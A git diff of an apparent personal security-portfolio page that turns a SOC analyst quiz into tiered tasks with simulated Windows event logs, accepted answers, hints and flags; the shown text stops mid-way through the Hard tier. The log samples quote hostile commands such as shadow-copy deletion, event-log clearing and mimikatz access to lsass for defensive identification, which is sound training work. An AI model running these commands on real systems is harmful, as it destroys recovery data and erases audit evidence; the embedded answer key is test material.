@@ -211,183 +211,105 @@
   .boot-line .info { color: var(--blue); }
   .boot-line .sep { color: var(--border-accent); }
 
-  /* SOC VALIDATION / QUIZ */
-  .soc-terminal {
-    background: var(--bg2);
-    border: 1px solid var(--border);
-    border-radius: 6px;
-    overflow: hidden;
-  }
+  /* SOC VALIDATION ROOM */
+  .soc-terminal { background: var(--bg2); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; box-shadow: 0 0 20px rgba(57,211,83,0.04); }
 
-  .terminal-bar {
-    background: var(--bg3);
-    border-bottom: 1px solid var(--border);
-    padding: 0.6rem 1rem;
-    display: flex;
-    align-items: center;
-    gap: 0.5rem;
-  }
-
+  .terminal-bar { background: var(--bg3); border-bottom: 1px solid var(--border); padding: 0.6rem 1rem; display: flex; align-items: center; gap: 0.5rem; }
   .terminal-title { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-dim); margin-left: 0.5rem; }
 
-  .quiz-progress {
-    padding: 0.75rem 1.25rem;
-    background: rgba(57,211,83,0.04);
-    border-bottom: 1px solid var(--border);
-    font-family: var(--font-mono);
-    font-size: 0.75rem;
-    color: var(--text-dim);
-  }
+  .soc-intro { padding: 1rem 1.5rem; border-bottom: 1px solid var(--border); background: rgba(0,0,0,0.15); }
+  .soc-intro-line { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.9; }
+  .soc-intro-line .arrow { color: var(--green); text-shadow: 0 0 4px rgba(57,211,83,0.4); }
 
-  .progress-bar-wrap { margin-top: 0.4rem; height: 3px; background: var(--border); border-radius: 2px; overflow: hidden; }
-  .progress-bar-fill { height: 100%; background: var(--green); border-radius: 2px; transition: width 0.5s ease; }
+  /* Room header */
+  .room-header { padding: 1.25rem 1.5rem; border-bottom: 1px solid var(--border); background: rgba(0,0,0,0.1); display: flex; align-items: center; justify-content: space-between; gap: 1rem; flex-wrap: wrap; }
+  .room-meta { display: flex; flex-direction: column; gap: 0.25rem; }
+  .room-name { font-family: var(--font-mono); font-size: 0.75rem; color: var(--green); letter-spacing: 0.08em; text-shadow: 0 0 6px rgba(57,211,83,0.4); }
+  .room-desc { font-size: 0.85rem; color: var(--text-dim); }
+  .room-progress-wrap { display: flex; flex-direction: column; align-items: flex-end; gap: 0.35rem; min-width: 140px; }
+  .room-progress-label { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+  .room-progress-bar { width: 140px; height: 4px; background: var(--border); border-radius: 2px; overflow: hidden; }
+  .room-progress-fill { height: 100%; background: var(--green); border-radius: 2px; transition: width 0.6s cubic-bezier(0.4,0,0.2,1); width: 0%; }
 
-  .soc-intro {
-    padding: 1.25rem 1.5rem;
-    border-bottom: 1px solid var(--border);
-    background: rgba(0,0,0,0.1);
-  }
+  .room-tier-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 0.12em; padding: 0.2rem 0.6rem; border-radius: 3px; font-weight: 700; border: 1px solid; display: inline-block; margin-bottom: 0.3rem; transition: all 0.4s; }
+  .tier-novice       { color: var(--green);  border-color: var(--green-dim);         background: rgba(57,211,83,0.08); }
+  .tier-intermediate { color: var(--blue);   border-color: rgba(88,166,255,0.3);     background: rgba(88,166,255,0.08); }
+  .tier-hard         { color: var(--yellow); border-color: rgba(227,179,65,0.35);    background: rgba(227,179,65,0.08); }
+  .tier-expert       { color: var(--red);    border-color: rgba(248,81,73,0.4);      background: rgba(248,81,73,0.1); }
 
-  .soc-intro-line {
-    font-family: var(--font-mono);
-    font-size: 0.78rem;
-    color: var(--text-dim);
-    line-height: 1.9;
-  }
+  .room-tier-track { display: flex; gap: 0.35rem; margin-top: 0.35rem; }
+  .tier-pip { width: 22px; height: 22px; border-radius: 50%; border: 1px solid var(--border-accent); font-family: var(--font-mono); font-size: 0.6rem; display: flex; align-items: center; justify-content: center; color: var(--text-dim); transition: all 0.4s; }
+  .tier-pip.done   { border-color: var(--green); color: var(--green); background: rgba(57,211,83,0.2); }
+  .tier-pip.active { border-color: var(--green); color: var(--green); background: rgba(57,211,83,0.1); }
+  .tier-pip[data-tier="1"].active { border-color: var(--blue);   color: var(--blue);   background: rgba(88,166,255,0.1); }
+  .tier-pip[data-tier="2"].active { border-color: var(--yellow); color: var(--yellow); background: rgba(227,179,65,0.1); }
+  .tier-pip[data-tier="3"].active { border-color: var(--red);    color: var(--red);    background: rgba(248,81,73,0.1); }
 
-  .soc-intro-line .arrow { color: var(--green); }
+  /* Task cards — sequential hidden system */
+  .task-card { overflow: hidden; }
+  .task-card.locked { display: none; }
+  .task-card.active { border-bottom: 1px solid var(--border); }
+  .task-card.active .task-card-inner { animation: slideIn 0.5s cubic-bezier(0.4,0,0.2,1); }
+  .task-card.completed { border-bottom: 1px solid var(--border); background: rgba(57,211,83,0.025); }
+  .task-card.completed .task-card-inner { opacity: 0.55; }
+  .task-card.completed .task-input { border-color: var(--green); background: rgba(57,211,83,0.05); color: var(--green); }
+  .task-card.completed .execute-btn { display: none; }
+  .task-card.completed .task-completed-badge { display: flex !important; }
+  .task-lock-bar { display: none !important; }
 
-  .quiz-task {
-    padding: 1.25rem 1.5rem;
-    border-bottom: 1px solid var(--border);
-  }
+  @keyframes slideIn { from{opacity:0;transform:translateY(14px)} to{opacity:1;transform:translateY(0)} }
+  @keyframes unlockFlash { 0%{background:rgba(57,211,83,0.1);box-shadow:inset 0 0 0 1px rgba(57,211,83,0.3)} 100%{background:transparent;box-shadow:none} }
+  .task-card.unlocking { animation: unlockFlash 0.8s ease forwards; }
 
-  .quiz-task:last-of-type { border-bottom: none; }
+  .task-card-inner { padding: 1.25rem 1.5rem; }
+  .task-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem; }
+  .task-num { font-family: var(--font-mono); font-size: 0.68rem; color: var(--green); background: rgba(57,211,83,0.08); border: 1px solid var(--green-dim); border-radius: 3px; padding: 0.2rem 0.55rem; white-space: nowrap; flex-shrink: 0; }
+  .task-title { font-weight: 700; font-size: 0.95rem; color: var(--text-bright); }
+  .task-completed-badge { display: none; align-items: center; gap: 0.4rem; font-family: var(--font-mono); font-size: 0.7rem; color: var(--green); margin-left: auto; }
 
-  .task-label {
-    font-family: var(--font-mono);
-    font-size: 0.72rem;
-    color: var(--green);
-    letter-spacing: 0.05em;
-    margin-bottom: 0.75rem;
-    text-transform: uppercase;
-  }
-
-  .code-block {
-    background: var(--bg);
-    border: 1px solid var(--border);
-    border-radius: 4px;
-    padding: 0.75rem 1rem;
-    font-family: var(--font-mono);
-    font-size: 0.8rem;
-    color: var(--cyan);
-    margin-bottom: 0.9rem;
-    line-height: 1.7;
-    white-space: pre-wrap;
-    word-break: break-word;
-  }
-
-  .task-prompt {
-    font-size: 0.9rem;
-    color: var(--text-dim);
-    margin-bottom: 0.75rem;
-  }
-
+  .code-block { background: var(--bg); border: 1px solid var(--border); border-radius: 4px; padding: 0.75rem 1rem; font-family: var(--font-mono); font-size: 0.8rem; color: var(--cyan); margin-bottom: 0.9rem; line-height: 1.7; white-space: pre-wrap; word-break: break-word; }
+  .task-prompt { font-size: 0.9rem; color: var(--text-dim); margin-bottom: 0.75rem; }
   .task-prompt::before { content: '> '; font-family: var(--font-mono); color: var(--green); }
-
   .task-input-row { display: flex; gap: 0.6rem; align-items: center; }
-
-  .task-input {
-    flex: 1;
-    background: var(--bg);
-    border: 1px solid var(--border-accent);
-    border-radius: 4px;
-    padding: 0.55rem 0.9rem;
-    font-family: var(--font-mono);
-    font-size: 0.82rem;
-    color: var(--text-bright);
-    outline: none;
-    transition: border-color 0.2s;
-  }
-
+  .task-input { flex: 1; background: var(--bg); border: 1px solid var(--border-accent); border-radius: 4px; padding: 0.55rem 0.9rem; font-family: var(--font-mono); font-size: 0.82rem; color: var(--text-bright); outline: none; transition: all 0.2s; }
   .task-input:focus { border-color: var(--green); box-shadow: 0 0 0 3px rgba(57,211,83,0.08); }
-  .task-input.correct { border-color: var(--green); background: rgba(57,211,83,0.05); }
-  .task-input.wrong { border-color: var(--red); background: rgba(248,81,73,0.05); animation: shake 0.3s ease; }
-
-  @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
-
-  .execute-btn {
-    background: var(--bg3);
-    border: 1px solid var(--border-accent);
-    color: var(--text);
-    font-family: var(--font-mono);
-    font-size: 0.78rem;
-    padding: 0.55rem 1.1rem;
-    border-radius: 4px;
-    cursor: pointer;
-    transition: all 0.2s;
-    white-space: nowrap;
-    letter-spacing: 0.03em;
-  }
-
+  .task-input.wrong { border-color: var(--red); background: rgba(248,81,73,0.05); animation: shake 0.35s ease; }
+  @keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-6px)} 75%{transform:translateX(6px)} }
+  .execute-btn { background: var(--bg3); border: 1px solid var(--border-accent); color: var(--text); font-family: var(--font-mono); font-size: 0.78rem; padding: 0.55rem 1.1rem; border-radius: 4px; cursor: pointer; transition: all 0.2s; white-space: nowrap; letter-spacing: 0.03em; }
   .execute-btn:hover:not(:disabled) { background: rgba(57,211,83,0.1); border-color: var(--green); color: var(--green); }
-  .execute-btn:disabled { opacity: 0.5; cursor: not-allowed; }
-
+  .execute-btn:disabled { opacity: 0.4; cursor: not-allowed; }
   .task-feedback { margin-top: 0.6rem; font-family: var(--font-mono); font-size: 0.78rem; min-height: 1.2em; }
   .feedback-correct { color: var(--green); }
   .feedback-wrong { color: var(--red); }
 
-  .lab-complete {
-    display: none;
-    padding: 2rem;
-    text-align: center;
-    border-top: 1px solid var(--border);
-  }
+  /* Hint */
+  .hint-btn { background: none; border: 1px solid var(--border-accent); color: var(--text-dim); font-family: var(--font-mono); font-size: 0.68rem; padding: 0.25rem 0.6rem; border-radius: 3px; cursor: pointer; transition: all 0.2s; margin-top: 0.5rem; }
+  .hint-btn:hover { border-color: var(--yellow); color: var(--yellow); }
+  .hint-text { font-family: var(--font-mono); font-size: 0.75rem; color: var(--yellow); margin-top: 0.5rem; display: none; padding: 0.5rem 0.75rem; background: rgba(227,179,65,0.06); border: 1px solid rgba(227,179,65,0.2); border-radius: 4px; line-height: 1.5; }
+  .hint-text.show { display: block; }
 
-  .lab-complete.show { display: block; }
-
-  .complete-badge {
-    display: inline-block;
-    font-family: var(--font-mono);
-    font-size: 0.75rem;
-    letter-spacing: 0.1em;
-    color: var(--green);
-    background: rgba(57,211,83,0.08);
-    border: 1px solid var(--green-dim);
-    border-radius: 4px;
-    padding: 0.4rem 1rem;
-    margin-bottom: 0.75rem;
-  }
-
-  .complete-title {
-    font-family: var(--font-mono);
-    font-size: 1.1rem;
-    color: var(--text-bright);
-    letter-spacing: 0.1em;
-    margin-bottom: 0.4rem;
-  }
-
-  .complete-sub { font-size: 0.9rem; color: var(--text-dim); margin-bottom: 1.25rem; }
-
-  .return-link {
-    display: inline-flex;
-    align-items: center;
-    gap: 0.5rem;
-    color: var(--green);
-    text-decoration: none;
-    font-weight: 600;
-    font-size: 0.85rem;
-    border: 1px solid var(--green-dim);
-    border-radius: 4px;
-    padding: 0.55rem 1.1rem;
-    background: rgba(57,211,83,0.05);
-    transition: all 0.2s;
-    font-family: var(--font-ui);
-    letter-spacing: 0.05em;
-    margin: 0 0.4rem;
-  }
-
-  .return-link:hover { background: rgba(57,211,83,0.12); border-color: var(--green); }
+  /* Completion overlay */
+  #completion-overlay { display: none; position: fixed; inset: 0; background: rgba(10,12,15,0.97); z-index: 10000; align-items: center; justify-content: center; flex-direction: column; }
+  #completion-overlay.show { display: flex; }
+  #completion-canvas { position: absolute; inset: 0; pointer-events: none; }
+  .completion-content { position: relative; z-index: 2; text-align: center; max-width: 520px; padding: 2rem; animation: completionReveal 0.55s cubic-bezier(0.4,0,0.2,1) forwards; }
+  @keyframes completionReveal { from{opacity:0;transform:scale(0.9) translateY(24px)} to{opacity:1;transform:scale(1) translateY(0)} }
+  .completion-badge-ring { width: 82px; height: 82px; border: 2px solid var(--green); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.5rem; font-size: 1.7rem; color: var(--green); box-shadow: 0 0 30px rgba(57,211,83,0.3),0 0 60px rgba(57,211,83,0.1); animation: ringPulse 2s ease infinite; }
+  @keyframes ringPulse { 0%,100%{box-shadow:0 0 30px rgba(57,211,83,0.3),0 0 60px rgba(57,211,83,0.1)} 50%{box-shadow:0 0 50px rgba(57,211,83,0.5),0 0 90px rgba(57,211,83,0.2)} }
+  .completion-flag { font-family: var(--font-mono); font-size: 0.72rem; letter-spacing: 0.15em; color: var(--green); background: rgba(57,211,83,0.08); border: 1px solid var(--green-dim); border-radius: 3px; padding: 0.35rem 0.9rem; display: inline-block; margin-bottom: 1rem; }
+  .completion-title { font-family: var(--font-mono); font-size: 1.5rem; color: var(--text-bright); letter-spacing: 0.08em; margin-bottom: 0.5rem; }
+  .completion-sub { color: var(--text-dim); font-size: 0.9rem; margin-bottom: 0.75rem; line-height: 1.6; }
+  .completion-typewriter { font-family: var(--font-mono); font-size: 0.78rem; color: var(--green); margin-bottom: 2rem; min-height: 1.4em; }
+  .completion-typewriter::after { content: '▋'; animation: blink 0.8s step-end infinite; }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+  .completion-stats { display: flex; gap: 2rem; justify-content: center; margin-bottom: 2rem; }
+  .cstat { text-align: center; }
+  .cstat-val { font-family: var(--font-mono); font-size: 1.4rem; color: var(--green); display: block; text-shadow: 0 0 12px rgba(57,211,83,0.5); }
+  .cstat-label { font-size: 0.72rem; color: var(--text-dim); letter-spacing: 0.08em; text-transform: uppercase; }
+  .completion-btn { background: transparent; border: 1px solid var(--green); color: var(--green); font-family: var(--font-mono); font-size: 0.8rem; padding: 0.65rem 1.5rem; border-radius: 4px; cursor: pointer; transition: all 0.2s; letter-spacing: 0.05em; margin: 0 0.4rem; }
+  .completion-btn:hover { background: rgba(57,211,83,0.1); }
+  .completion-btn.secondary { border-color: var(--border-accent); color: var(--text-dim); }
+  .completion-btn.secondary:hover { border-color: var(--text-dim); color: var(--text); }
 
   @media (max-width: 600px) {
     .container { padding: 1.5rem 1rem; }
@@ -396,12 +318,35 @@
     .execute-btn { width: 100%; text-align: center; }
     .arch-grid { grid-template-columns: repeat(2, 1fr); }
   }
+
+  #binary-canvas{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;opacity:0.25;}
+  nav,.container{position:relative;z-index:1;}
+  nav{background:rgba(13,17,23,0.9)!important;backdrop-filter:blur(10px);}
+  .nav-brand{text-shadow:0 0 12px rgba(57,211,83,0.5)!important;}
+  .nav-links a:hover,.nav-links a.active{text-shadow:0 0 8px rgba(57,211,83,0.4)!important;}
+  .page-title::before{text-shadow:0 0 10px rgba(57,211,83,0.6);animation:glitch 5s infinite;}
+  @keyframes glitch{0%,88%,100%{transform:translate(0);text-shadow:0 0 10px rgba(57,211,83,0.6);}89%{transform:translate(-2px,1px);text-shadow:2px 0 #79c0ff;}90%{transform:translate(2px,-1px);text-shadow:-2px 0 #f85149;}91%{transform:translate(0);}93%{transform:translate(1px,1px);text-shadow:-1px 0 #79c0ff;}94%{transform:translate(0);}}
+  .section-title{overflow:hidden;position:relative;}
+  .section-title::before{box-shadow:0 0 6px var(--green);animation:barPulse 2.5s ease-in-out infinite;}
+  .section-title::after{content:"";position:absolute;top:0;left:-60%;width:60%;height:100%;background:linear-gradient(90deg,transparent,rgba(57,211,83,0.07),transparent);animation:sweep 4s ease-in-out infinite;}
+  @keyframes barPulse{0%,100%{opacity:1;box-shadow:0 0 6px var(--green)}50%{opacity:0.4;box-shadow:none}}
+  @keyframes sweep{0%{left:-60%}50%{left:160%}100%{left:160%}}
+  .page-nav-link,.project-link,.return-link{box-shadow:0 0 10px rgba(57,211,83,0.08);}
+  .page-nav-link:hover,.project-link:hover,.return-link:hover{box-shadow:0 0 18px rgba(57,211,83,0.2);}
+  .stat-value,.cstat-val{text-shadow:0 0 12px rgba(57,211,83,0.5);}
+  .task-num,.step-badge,.step-num{text-shadow:0 0 4px rgba(57,211,83,0.3);}
+  .feedback-correct{text-shadow:0 0 6px rgba(57,211,83,0.5);}
+  .execute-btn:hover:not(:disabled){box-shadow:0 0 10px rgba(57,211,83,0.15);}
+  .boot-line .ok{text-shadow:0 0 4px rgba(57,211,83,0.3);}
+  .detect-table td:first-child{text-shadow:0 0 4px rgba(121,192,255,0.3);}
+
 </style>
 </head>
 <body>
+<canvas id="binary-canvas"></canvas>
 
 <nav>
-  <div class="nav-brand">[ DOMENICO :: OPSEC ]</div>
+  <div class="nav-brand" data-glitch>[ DOMENICO :: OPSEC ]</div>
   <ul class="nav-links">
     <li><a href="index.html">Home</a></li>
     <li><a href="projects.html" class="active">Projects</a></li>
@@ -473,31 +418,6 @@
         <div class="arch-node-icon">ATK</div>
         <div class="arch-node-name">Attacker VM</div>
         <div class="arch-node-detail">Isolated · sandboxed</div>
-      </div>
-    </div>
-  </div>
-
-  <!-- BOOT SEQUENCE STATUS -->
-  <div class="section">
-    <div class="section-title">Lab Boot Status</div>
-    <div class="boot-sequence">
-      <div class="boot-bar">
-        <div class="dot dot-red"></div>
-        <div class="dot dot-yellow"></div>
-        <div class="dot dot-green"></div>
-        <span class="boot-title">lab-init.sh — environment bootstrap</span>
-      </div>
-      <div class="boot-body">
-        <div class="boot-line"><span class="prompt">$ </span>./lab-init.sh --env enterprise-ad</div>
-        <div class="boot-line"><span class="ok">  [✔]</span> Domain Controller (WinSrv 2019) — ONLINE</div>
-        <div class="boot-line"><span class="ok">  [✔]</span> Workstation-01 joined to domain — OK</div>
-        <div class="boot-line"><span class="ok">  [✔]</span> Workstation-02 joined to domain — OK</div>
-        <div class="boot-line"><span class="ok">  [✔]</span> File Server mounted — OK</div>
-        <div class="boot-line"><span class="ok">  [✔]</span> Windows Event Forwarding — ACTIVE</div>
-        <div class="boot-line"><span class="ok">  [✔]</span> Audit Policy configured (4688, 4624, 4625, 7045)</div>
-        <div class="boot-line"><span class="warn">  [⚠]</span> Attacker VM — ISOLATED / network-segmented</div>
-        <div class="boot-line"><span class="sep">  ────────────────────────────────────────</span></div>
-        <div class="boot-line"><span class="info">  [→]</span> Lab ready. Proceed to Phase 1.</div>
       </div>
     </div>
   </div>
@@ -577,16 +497,14 @@
 
   </div>
 
-  <!-- SOC VALIDATION QUIZ -->
+  <!-- SOC VALIDATION ROOM -->
   <div class="section">
-    <div class="section-title">Operational Validation – Analyst Competency Check</div>
+    <div class="section-title">Operational Validation – SOC Analyst Room</div>
 
-    <div class="soc-terminal">
+    <div class="soc-terminal" id="room-terminal">
       <div class="terminal-bar">
-        <div class="dot dot-red"></div>
-        <div class="dot dot-yellow"></div>
-        <div class="dot dot-green"></div>
-        <span class="terminal-title">soc-validation.sh — incident telemetry review console</span>
+        <div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div>
+        <span class="terminal-title" id="terminal-title">soc-validation.sh — tier 1: novice</span>
       </div>
 
       <div class="soc-intro">
@@ -595,159 +513,386 @@
         <div class="soc-intro-line"><span class="arrow">&gt;</span> Analyst response workflow initialized...</div>
       </div>
 
-      <div class="quiz-progress">
-        <span id="progress-text">Progress: 0 / 4 Tasks Completed</span>
-        <div class="progress-bar-wrap">
-          <div class="progress-bar-fill" id="progress-fill" style="width:0%"></div>
+      <div class="room-header">
+        <div class="room-meta">
+          <div class="room-name" id="room-name">[ ROOM ] SOC ANALYST COMPETENCY CHECK — NOVICE</div>
+          <div class="room-desc" id="room-desc">Review live telemetry and identify the correct artifacts. Answer each task to unlock the next.</div>
+        </div>
+        <div class="room-progress-wrap">
+          <div class="room-tier-badge tier-novice" id="room-tier-badge">NOVICE</div>
+          <div class="room-progress-label" id="room-progress-label">0 / 4 Tasks</div>
+          <div class="room-progress-bar"><div class="room-progress-fill" id="room-progress-fill"></div></div>
+          <div class="room-tier-track">
+            <span class="tier-pip active" data-tier="0">N</span>
+            <span class="tier-pip" data-tier="1">I</span>
+            <span class="tier-pip" data-tier="2">H</span>
+            <span class="tier-pip" data-tier="3">E</span>
+          </div>
         </div>
       </div>
 
-      <!-- Task 1 -->
-      <div class="quiz-task" id="task1">
-        <div class="task-label">[ Task 1 ] – Initial Access Detection</div>
-        <div class="code-block">Event ID: 4625 | Failed Logon | Source IP: 185.221.99.14
-Event ID: 4625 | Failed Logon | Source IP: 185.221.99.14
-Event ID: 4624 | Logon Type 10 | Source IP: 185.221.99.14</div>
-        <div class="task-prompt">Identify the Event ID confirming successful RDP authentication:</div>
-        <div class="task-input-row">
-          <input class="task-input" id="input1" type="text" placeholder="Enter Event ID..." autocomplete="off" />
-          <button class="execute-btn" onclick="checkAnswer(1)">Execute</button>
-        </div>
-        <div class="task-feedback" id="feedback1"></div>
-      </div>
-
-      <!-- Task 2 -->
-      <div class="quiz-task" id="task2">
-        <div class="task-label">[ Task 2 ] – Credential Access Identification</div>
-        <div class="code-block">Process Created: mimikatz.exe
-Event ID: 4688
-Target Process Accessed: lsass.exe</div>
-        <div class="task-prompt">Which Windows process is being targeted for credential extraction?</div>
-        <div class="task-input-row">
-          <input class="task-input" id="input2" type="text" placeholder="Enter process name..." autocomplete="off" />
-          <button class="execute-btn" onclick="checkAnswer(2)">Execute</button>
-        </div>
-        <div class="task-feedback" id="feedback2"></div>
-      </div>
-
-      <!-- Task 3 -->
-      <div class="quiz-task" id="task3">
-        <div class="task-label">[ Task 3 ] – Lateral Movement Artifact</div>
-        <div class="code-block">New Service Installed
-Event ID: 7045
-Binary Path: \\192.168.1.15\ADMIN$\payload.exe</div>
-        <div class="task-prompt">What Event ID indicates service-based lateral movement?</div>
-        <div class="task-input-row">
-          <input class="task-input" id="input3" type="text" placeholder="Enter Event ID..." autocomplete="off" />
-          <button class="execute-btn" onclick="checkAnswer(3)">Execute</button>
-        </div>
-        <div class="task-feedback" id="feedback3"></div>
-      </div>
-
-      <!-- Task 4 -->
-      <div class="quiz-task" id="task4">
-        <div class="task-label">[ Task 4 ] – Impact Analysis</div>
-        <div class="code-block">Command Executed:
-vssadmin delete shadows /all /quiet</div>
-        <div class="task-prompt">What Windows recovery feature is being targeted by this command?</div>
-        <div class="task-input-row">
-          <input class="task-input" id="input4" type="text" placeholder="Enter recovery feature..." autocomplete="off" />
-          <button class="execute-btn" onclick="checkAnswer(4)">Execute</button>
-        </div>
-        <div class="task-feedback" id="feedback4"></div>
-      </div>
-
-      <div class="lab-complete" id="lab-complete">
-        <div class="complete-badge">✔ ALL TASKS COMPLETED</div>
-        <div class="complete-title">LAB COMPLETE</div>
-        <div class="complete-sub">Incident response simulation successfully completed. All adversary behaviors identified and analyzed.</div>
-        <a href="#" onclick="resetLab(); return false;" class="return-link">↺ Restart Lab</a>
-        <a href="projects.html" class="return-link">← Exit to Projects</a>
-      </div>
-
+      <div class="task-list" id="task-list"></div>
     </div>
   </div>
 
 </div>
 
+<!-- COMPLETION OVERLAY -->
+<div id="completion-overlay">
+  <canvas id="completion-canvas"></canvas>
+  <div class="completion-content">
+    <div class="completion-badge-ring">✔</div>
+    <div class="completion-flag" id="completion-flag">TIER COMPLETE</div>
+    <div class="completion-title" id="completion-title">TIER CLEARED</div>
+    <div class="completion-sub" id="completion-sub">All tasks validated.</div>
+    <div class="completion-typewriter" id="typewriter-text"></div>
+    <div class="completion-stats">
+      <div class="cstat"><span class="cstat-val" id="stat-tasks">4/16</span><span class="cstat-label">Total Tasks</span></div>
+      <div class="cstat"><span class="cstat-val" id="stat-score">100%</span><span class="cstat-label">Score</span></div>
+      <div class="cstat"><span class="cstat-val" id="stat-time">—</span><span class="cstat-label">Time</span></div>
+    </div>
+    <div>
+      <button class="completion-btn secondary" id="retry-tier-btn" onclick="retryTier()">↺ Retry Tier</button>
+      <button class="completion-btn" id="next-tier-btn" onclick="advanceTier()">→ Next Tier</button>
+    </div>
+  </div>
+</div>
+
 <script>
   // ─── PHASE TOGGLES ────────────────────────────────────────────────────────
-  function togglePhase(el) {
-    el.classList.toggle('open');
+  function togglePhase(el) { el.classList.toggle('open'); }
+
+  // ─── TIER DATA ────────────────────────────────────────────────────────────
+  const TIERS = [
+    {
+      id:0, label:'NOVICE', tierClass:'tier-novice', accent:'#39d353',
+      terminalLabel:'soc-validation.sh — tier 1: novice',
+      roomName:'[ ROOM ] SOC ANALYST COMPETENCY CHECK — NOVICE',
+      roomDesc:'Identify key telemetry artifacts from the emulation. Answer correctly to unlock the next task.',
+      completionTitle:'NOVICE TIER CLEARED',
+      completionSub:'Foundational SOC artifact identification validated. Advancing to Intermediate.',
+      completionFlag:'THM{soc_novice_certified}',
+      nextLabel:'INTERMEDIATE',
+      tasks:[
+        { title:'Initial Access Detection',
+          code:'Event ID: 4625 | Failed Logon | Source IP: 185.221.99.14\nEvent ID: 4625 | Failed Logon | Source IP: 185.221.99.14\nEvent ID: 4624 | Logon Type 10 | Source IP: 185.221.99.14',
+          prompt:'Identify the Event ID confirming successful RDP authentication:',
+          placeholder:'Enter Event ID...', answers:['4624'], hint:null },
+        { title:'Credential Access Identification',
+          code:'Process Created: mimikatz.exe\nEvent ID: 4688\nTarget Process Accessed: lsass.exe',
+          prompt:'Which Windows process is being targeted for credential extraction?',
+          placeholder:'Enter process name...', answers:['lsass.exe','lsass'], hint:null },
+        { title:'Lateral Movement Artifact',
+          code:'New Service Installed\nEvent ID: 7045\nBinary Path: \\\\192.168.1.15\\ADMIN$\\payload.exe',
+          prompt:'What Event ID indicates service-based lateral movement?',
+          placeholder:'Enter Event ID...', answers:['7045'], hint:null },
+        { title:'Impact Analysis',
+          code:'Command Executed:\nvssadmin delete shadows /all /quiet',
+          prompt:'What Windows recovery feature is being targeted by this command?',
+          placeholder:'Enter recovery feature...', answers:['volume shadow copies','shadow copies','vss','volume shadow copy service','shadow copy','windows shadow copies'], hint:null }
+      ]
+    },
+    {
+      id:1, label:'INTERMEDIATE', tierClass:'tier-intermediate', accent:'#58a6ff',
+      terminalLabel:'soc-validation.sh — tier 2: intermediate',
+      roomName:'[ ROOM ] SOC ANALYST COMPETENCY CHECK — INTERMEDIATE',
+      roomDesc:'Deeper log correlation and MITRE sub-technique mapping. Hints available on request.',
+      completionTitle:'INTERMEDIATE TIER CLEARED',
+      completionSub:'Log correlation and sub-technique mapping validated. Advancing to Hard.',
+      completionFlag:'THM{soc_intermediate_analyst}',
+      nextLabel:'HARD',
+      tasks:[
+        { title:'Privilege Escalation via Token Impersonation',
+          code:'Event ID: 4672 — Special Privileges Assigned\nAccount: svc_backup\nPrivileges: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege\nProcess: cmd.exe spawned under SYSTEM context',
+          prompt:'What MITRE ATT&CK sub-technique describes token impersonation for privilege escalation?',
+          placeholder:'Enter sub-technique ID (T1134.xxx)...', answers:['t1134.001','1134.001'],
+          hint:'T1134 covers Access Token Manipulation. The sub-technique for stealing another process token is .001.' },
+        { title:'Process Injection Detection',
+          code:'Event ID: 4688 — powershell.exe created\nParent: winword.exe\nCommandLine: powershell -enc [base64 blob]\nEvent ID: 8 — CreateRemoteThread\nSource: powershell.exe → Target: svchost.exe',
+          prompt:'What MITRE ATT&CK technique ID describes injecting code into a remote process via CreateRemoteThread?',
+          placeholder:'Enter technique ID (T1055.xxx)...', answers:['t1055.003','1055.003'],
+          hint:'T1055 is Process Injection. The sub-technique for Thread Execution Hijacking via CreateRemoteThread is .003.' },
+        { title:'Scheduled Task Persistence',
+          code:'Event ID: 4698 — Scheduled Task Created\nTask Name: \\Microsoft\\Windows\\UpdateCheck\nAction: powershell.exe -WindowStyle Hidden -File C:\\ProgramData\\update.ps1\nTrigger: On System Startup\nCreated By: DOMAIN\\compromised_user',
+          prompt:'What MITRE ATT&CK sub-technique ID covers scheduled task persistence?',
+          placeholder:'Enter sub-technique ID (T1053.xxx)...', answers:['t1053.005','1053.005'],
+          hint:'T1053 covers Scheduled Task/Job. The Windows-specific sub-technique is .005.' },
+        { title:'Defence Evasion — Indicator Removal',
+          code:'Event ID: 1102 — Audit Log Cleared\nSubject: DOMAIN\\admin_compromised\nEvent ID: 4688 — wevtutil.exe\nCommandLine: wevtutil cl Security\nCommandLine: wevtutil cl System\nCommandLine: wevtutil cl Application',
+          prompt:'What MITRE ATT&CK sub-technique describes clearing Windows event logs to remove indicators?',
+          placeholder:'Enter sub-technique ID (T1070.xxx)...', answers:['t1070.001','1070.001'],
+          hint:'T1070 is Indicator Removal. Sub-technique .001 specifically covers clearing Windows event logs.' }
+      ]
+    },
+    {
+      id:2, label:'HARD', tierClass:'tier-hard', accent:'#e3b341',
+      terminalLabel:'soc-validation.sh — tier 3: hard',
+      roomName:'[ ROOM ] SOC ANALYST COMPETENCY CHECK — HARD',
+      roomDesc:'Full attack chain reconstruction from raw logs. Identify the kill chain stage and threat actor.',
+      completionTitle:'HARD TIER CLEARED',
+      completionSub:'Attack chain reconstruction and attribution validated. Final tier unlocked.',
+      completionFlag:'THM{soc_hard_ir_analyst}',
+      nextLabel:'EXPERT',
+      tasks:[
+        { title:'Full Kill Chain Reconstruction',
+          code:'08:01:14 — 4625 x312 from 185.220.101.45 → admin account\n08:03:47 — 4624 success, LogonType:10, admin, src:185.220.101.45\n08:04:02 — 4688 cmd.exe → powershell.exe -enc [blob]\n08:04:09 — 4688 powershell.exe → mimikatz.exe\n08:04:15 — 4656 lsass.exe handle opened, GrantedAccess:0x1010\n08:06:33 — 4624 LogonType:3 to WS-02 using harvested creds\n08:07:01 — 7045 new service on WS-02, binary: \\\\WS-02\\ADMIN$\\svhost32.exe\n08:41:22 — vssadmin delete shadows /all /quiet',
+          prompt:'List the 5 MITRE ATT&CK tactics in order as they appear in this log sequence:',
